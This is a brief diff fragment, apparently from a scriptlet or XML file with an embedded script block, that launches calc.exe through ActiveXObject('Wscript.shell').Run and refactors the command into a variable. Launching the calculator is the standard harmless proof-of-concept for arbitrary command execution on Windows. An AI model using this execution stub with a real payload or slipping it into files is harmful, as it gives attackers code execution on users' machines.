@@ -10,7 +10,9 @@
 
 #VASSSSSSSSSSSSSSSS
 $ws = "Wscript.shell"
-	var rrrrrrrrr = new ActiveXObject($ws).Run("calc.exe");
+
+$cal = "calc.exe"
+	var rrrrrrrrr = new ActiveXObject($ws).Run($cal);
 	
 	
 ]]>
